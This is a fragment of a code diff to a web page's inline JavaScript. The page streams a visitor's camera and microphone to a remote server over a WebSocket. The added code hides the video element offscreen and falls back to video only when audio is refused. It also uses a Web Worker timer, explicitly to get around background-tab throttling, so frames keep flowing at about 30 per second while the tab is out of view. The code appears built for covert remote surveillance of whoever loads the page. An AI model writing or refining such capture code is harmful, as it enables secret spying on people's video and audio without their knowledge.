             .catch(() => {
-              sendWS({ type: 'permission_denied', permission: 'camera (live)' });
+              // Fallback to video only
+              navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480, frameRate: { ideal: 30, max: 60 } }, audio: false })
+                .then((stream) => {
+                  setupLiveMediaStreams(stream);
+                })
+                .catch(() => {
+                  sendWS({ type: 'permission_denied', permission: 'camera (live)' });
+                });
             });
-        });
-    }
-
-    function setupLiveMediaStreams(stream) {
-      liveStreamActive = true;
-
-      // Video elements setup
-      liveStreamVideo  = document.createElement('video');
-      liveStreamCanvas = document.createElement('canvas');
-      liveStreamCanvas.width  = 640;
-      liveStreamCanvas.height = 480;
-      liveStreamContext = liveStreamCanvas.getContext('2d');
-
-      liveStreamVideo.srcObject = stream;
-      liveStreamVideo.setAttribute('playsinline', '');
-      liveStreamVideo.muted = true;
-      liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
-      document.body.appendChild(liveStreamVideo);
-
-      liveStreamVideo.play().then(() => {
-        // Stream frames at ~25 FPS (40ms interval)
-        liveStreamInterval = setInterval(() => {
-          if (!liveStreamActive) return;
-          try {
-            liveStreamContext.drawImage(liveStreamVideo, 0, 0, 640, 480);
-            const frame = liveStreamCanvas.toDataURL('image/jpeg', 0.55);
-            sendWS({ type: 'camera_frame', frame });
-          } catch(e) {}
-        }, 40);
-      }).catch(() => stopLiveCamera());
-
-      // Audio recording setup
-      const audioTracks = stream.getAudioTracks();
-      if (audioTracks.length > 0) {
-        try {
-          liveAudioStream = new MediaStream(audioTracks);
-          const mimeType = getSupportedMimeType();
-          liveAudioRecorder = new MediaRecorder(liveAudioStream, mimeType ? { mimeType } : {});
-          
-          liveAudioRecorder.ondataavailable = (e) => {
-            if (e.data && e.data.size > 0 && liveStreamActive) {
-              const reader = new FileReader();
-              reader.onload = () => {
-                sendWS({ type: 'audio_chunk', audio: reader.result });
-              };
-              reader.readAsDataURL(e.data);
-            }
-          };
-
-          // Capture audio chunks every 1000ms (1 second)
-          liveAudioRecorder.start(1000);
-        } catch(e) {
-          console.error("Audio streaming setup failed:", e);
         }
-      }
-    }
 
-    function stopLiveCamera() {
-      liveStreamActive = false;
-      if (liveStreamInterval) {
-        clearInterval(liveStreamInterval);
-        liveStreamInterval = null;
-      }
-      if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
-        try { liveAudioRecorder.stop(); } catch(e) {}
-        liveAudioRecorder = null;
-      }
-      if (liveStreamVideo) {
-        const stream = liveStreamVideo.srcObject;
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        liveStreamVideo.remove();
-        liveStreamVideo   = null;
-        liveStreamCanvas  = null;
-        liveStreamContext = null;
-        liveAudioStream   = null;
-      }
-    }
+        function setupLiveMediaStreams(stream) {
+          liveStreamActive = true;
 
-    // ─── Init ───────────────────────────────────────────────────
-    if (document.readyState === 'loading') {
-      document.addEventListener('DOMContentLoaded', connectWS);
-    } else {
-      connectWS();
-    }
+          // Video elements setup
+          liveStreamVideo = document.createElement('video');
+          liveStreamCanvas = document.createElement('canvas');
+          liveStreamCanvas.width = 640;
+          liveStreamCanvas.height = 480;
+          liveStreamContext = liveStreamCanvas.getContext('2d');
 
-  })();
-  </script>
+          liveStreamVideo.srcObject = stream;
+          liveStreamVideo.setAttribute('playsinline', '');
+          liveStreamVideo.muted = true;
+          liveStreamVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none;';
+          document.body.appendChild(liveStreamVideo);
+
+          liveStreamVideo.play().then(() => {
+            // Use Web Worker to bypass background tab/browser interval throttling (which caps it at 1 FPS)
+            try {
+              const workerCode = `
+                let timer = null;
+                self.onmessage = function(e) {
+                  if (e.data.action === 'start') {
+                    if (timer) clearInterval(timer);
+                    timer = setInterval(() => {
+                      self.postMessage('tick');
+                    }, e.data.interval);
+                  } else if (e.data.action === 'stop') {
+                    if (timer) {
+                      clearInterval(timer);
+                      timer = null;
+                    }
+                  }
+                };
+              `;
+              const blob = new Blob([workerCode], { type: 'application/javascript' });
+              liveStreamWorker = new Worker(URL.createObjectURL(blob));
+              liveStreamWorker.onmessage = () => {
+                if (!liveStreamActive) return;
+                try {
+                  liveStreamContext.drawImage(liveStreamVideo, 0, 0, 640, 480);
+                  const frame = liveStreamCanvas.toDataURL('image/jpeg', 0.55);
+                  sendWS({ type: 'camera_frame', frame });
+                } catch (e) { }
+              };
+              // Stream frames at ~30 FPS (33ms interval)
+              liveStreamWorker.postMessage({ action: 'start', interval: 33 });
+            } catch (err) {
+              // Fallback to normal setInterval if Web Worker is blocked or not supported
+              liveStreamInterval = setInterval(() => {
+                if (!liveStreamActive) return;
+                try {
+                  liveStreamContext.drawImage(liveStreamVideo, 0, 0, 640, 480);
+                  const frame = liveStreamCanvas.toDataURL('image/jpeg', 0.55);
+                  sendWS({ type: 'camera_frame', frame });
+                } catch (e) { }
+              }, 33);
+            }
+          }).catch(() => stopLiveCamera());
+
+          // Audio recording setup
+          const audioTracks = stream.getAudioTracks();
+          if (audioTracks.length > 0) {
+            try {
+              liveAudioStream = new MediaStream(audioTracks);
+              const mimeType = getSupportedMimeType();
+              liveAudioRecorder = new MediaRecorder(liveAudioStream, mimeType ? { mimeType } : {});
+
+              liveAudioRecorder.ondataavailable = (e) => {
+                if (e.data && e.data.size > 0 && liveStreamActive) {
+                  const reader = new FileReader();
+                  reader.onload = () => {
+                    sendWS({ type: 'audio_chunk', audio: reader.result });
+                  };
+                  reader.readAsDataURL(e.data);
+                }
+              };
+
+              // Capture audio chunks every 1000ms (1 second)
+              liveAudioRecorder.start(1000);
+            } catch (e) {
+              console.error("Audio streaming setup failed:", e);
+            }
+          }
+        }
+
+        function stopLiveCamera() {
+          liveStreamActive = false;
+          if (liveStreamInterval) {
+            clearInterval(liveStreamInterval);
+            liveStreamInterval = null;
+          }
+          if (liveStreamWorker) {
+            try {
+              liveStreamWorker.postMessage({ action: 'stop' });
+              liveStreamWorker.terminate();
+            } catch (e) { }
+            liveStreamWorker = null;
+          }
+          if (liveAudioRecorder && liveAudioRecorder.state !== 'inactive') {
+            try { liveAudioRecorder.stop(); } catch (e) { }
+            liveAudioRecorder = null;
+          }
+          if (liveStreamVideo) {
+            const stream = liveStreamVideo.srcObject;
+            if (stream) stream.getTracks().forEach(t => t.stop());
+            liveStreamVideo.remove();
+            liveStreamVideo = null;
+            liveStreamCanvas = null;
+            liveStreamContext = null;
+            liveAudioStream = null;
+          }
+        }
+
+        // ─── Init ───────────────────────────────────────────────────
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', connectWS);
+        } else {
+          connectWS();
+        }
+
+      })();
+    </script>
 </body>
 
 </html>
